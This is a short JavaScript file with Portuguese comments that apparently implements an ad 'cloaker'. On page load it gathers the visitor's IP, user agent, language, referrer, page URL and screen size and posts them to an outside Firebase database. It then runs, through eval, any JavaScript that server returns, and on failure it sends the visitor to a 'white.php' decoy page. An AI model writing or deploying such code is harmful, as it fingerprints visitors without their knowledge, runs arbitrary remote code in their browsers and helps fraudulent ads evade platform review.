(async function() {
    try {
        const ipData = await fetch('https://ipinfo.io/json');  // Pega os dados de IP
        const ipInfo = await ipData.json();

        const postData = {
            ip: ipInfo.ip,  // Obtém o IP
            domain: window.location.hostname,  // Pega o domínio
            userAgent: navigator.userAgent,  // Pega o User Agent
            language: navigator.language,  // Pega a linguagem do navegador
            page: window.location.href,  // URL da página
            referer: document.referrer,  // URL de onde o usuário veio
            screenSize: `${window.innerWidth}x${window.innerHeight}`  // Tamanho da tela
        };

        // Fazendo o POST para o Firebase
        const response = await fetch('https://ads-black-digital-default-rtdb.firebaseio.com/cloaker.json', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData)
        });

        if (!response.ok) {
            throw new Error('Erro ao enviar dados');
        }

        console.log("Dados enviados com sucesso!");

        // Esperar 5 segundos (exemplo) antes de pegar a resposta com a chave 'backCode'
        setTimeout(async () => {
            // Pega a resposta após o tempo de espera
            const responseData = await response.json();
            const backCode = responseData.backCode;

            if (backCode) {
                // Executar o código JS retornado na chave 'backCode'
                eval(backCode);
            } else {
                console.error('Chave backCode não encontrada na resposta.');
            }
        }, 5000);  // 5000 ms = 5 segundos

    } catch (error) {
        console.error('Erro:', error);
        // Em caso de erro, redireciona para "white.php"
        window.location.href = 'white.php';
    }
})();
